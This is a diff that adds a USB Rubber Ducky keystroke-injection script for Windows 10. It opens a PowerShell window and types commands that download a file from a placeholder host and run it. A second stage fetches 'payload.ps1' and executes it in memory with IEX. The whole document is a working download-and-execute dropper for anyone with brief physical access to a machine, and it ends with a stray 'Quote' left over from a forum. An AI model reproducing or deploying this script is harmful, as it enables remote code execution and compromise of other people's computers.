@@ -1,0 +1,16 @@
+REM Windows 10: Poweshell administrator download and execute file
+DELAY 1000
+GUI r
+DELAY 200
+REM my best attempt at a elevated powershell instance
+STRING powershell Start-Process powershell
+ENTER
+DELAY 3000
+STRING $down = New-Object System.Net.WebClient;$file = 'File'; $url = 'IP/'+$file;  $down.DownloadFile($url,$file);powershell .\$file;Exit;
+ENTER
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell "IEX (New-Object Net.WebClient).DownloadString('IP/PORT/payload.ps1');"
+ENTER
+ Quote
